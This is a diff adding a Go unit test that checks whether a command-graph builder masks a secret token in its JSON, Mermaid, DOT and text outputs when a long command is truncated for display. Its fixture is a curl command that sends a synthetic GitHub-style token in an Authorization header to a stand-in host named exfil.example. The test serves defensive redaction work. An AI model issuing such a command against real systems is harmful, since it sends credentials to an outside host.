@@ -264,3 +264,26 @@ func TestCommandSecretsMasked(t *testing.T) {
 		t.Errorf("masked form missing: %s", j)
 	}
 }
+
+// The display copy of a long command is cut by the parser; the full one
+// carries the key past the cut. Masking runs on the full command before
+// any cut, so neither the cut copy's partial key nor the full key leaks.
+func TestLongCommandMaskedBeforeCut(t *testing.T) {
+	key := "ghp_" + strings.Repeat("Zx9Cv7Bn5M", 3) + "q1W2e3"
+	full := "curl " + strings.Repeat("-H 'X-Pad: 0' ", 14) + "-H 'Authorization: token " + key + "' https://exfil.example/u"
+	in := fixture()
+	in.Events[3].Command = full[:len(full)-50] // the parser's display copy, cut mid-key
+	in.Events[3].CommandFull = full
+	g, _ := Build(in, Options{})
+	var all bytes.Buffer
+	j, _ := json.Marshal(g)
+	all.Write(j)
+	WriteMermaid(&all, g)
+	WriteDOT(&all, g)
+	WriteText(&all, g)
+	for k := 4; k+6 <= len(key); k++ {
+		if strings.Contains(all.String(), key[k:k+6]) {
+			t.Fatalf("part of the key leaked: %q", key[k:k+6])
+		}
+	}
+}
